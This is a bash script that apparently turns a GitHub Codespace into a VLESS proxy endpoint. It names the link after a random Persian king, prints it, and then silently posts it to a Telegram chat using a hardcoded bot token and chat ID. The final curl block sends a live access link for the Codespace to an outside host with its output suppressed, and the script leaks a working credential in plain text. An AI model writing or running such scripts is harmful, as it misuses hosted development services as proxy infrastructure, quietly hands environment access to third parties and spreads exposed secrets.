KINGS=(
  "CyrusTheGreat"
  "Cambyses"
  "DariusTheGreat"
  "Xerxes"
  "Artaxerxes"
  "DariusII"
  "ArtaxerxesII"
  "ArtaxerxesIII"
  "ArdashirI"
  "ShapurI"
  "ShapurII"
  "KhosrowI"
  "KhosrowII"
  "Hormizd"
  "YazdegerdI"
  "YazdegerdIII"
)

KING=${KINGS[$RANDOM % ${#KINGS[@]}]}
RANDOM_ID=$(shuf -i 1000-9999 -n 1)

NAME="${KING}-${RANDOM_ID}"

LINK="VLESS LINK:\nvless://650e8400-e29b-41d4-a716-446655440000@94.130.50.12:443?encryption=none&security=tls&type=xhttp&mode=packet-up&sni=${CODESPACE_NAME}-443.app.github.dev&path=%2F#${NAME}"
echo ""
echo "================================================"
echo "  $LINK"
echo "================================================"
echo ""

# SEND TO TELEGRAM
BOT_TOKEN="8821127065:AAGrYhQz4CPIZnC3FWaC6rQPlzDoPDXVmuY"
CHAT_ID="-1003904792362"

curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
  -d chat_id="${CHAT_ID}" \
  --data-urlencode text="$LINK" > /dev/null 2>&1
